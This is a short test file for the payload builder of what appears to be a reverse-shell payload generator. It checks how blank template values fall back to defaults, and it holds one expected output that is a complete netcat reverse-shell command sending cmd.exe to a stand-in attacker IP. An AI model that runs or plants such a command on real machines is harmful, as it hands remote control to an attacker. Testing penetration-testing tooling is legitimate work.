import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import { REVERSE_SHELLS } from "../../../engines/payloads/reverseShells";

describe("buildPayload blank values", () => {
  const nc = REVERSE_SHELLS.find((d) => d.id === "nc-exe")!;
  it("a blank or whitespace value falls back to the def default", () => {
    for (const FILE of ["", "   "]) {
      const b = buildPayload(nc, "cmd", { LHOST: "192.0.2.10", LPORT: "443", FILE });
      expect(b.text).toBe("C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443");
      expect(b.unresolved).toEqual([]);
    }
  });
  it("a blank value with no default is still unresolved", () => {
    expect(buildPayload(nc, "cmd", { LHOST: " ", LPORT: "443" }).unresolved).toEqual(["LHOST"]);
  });
});
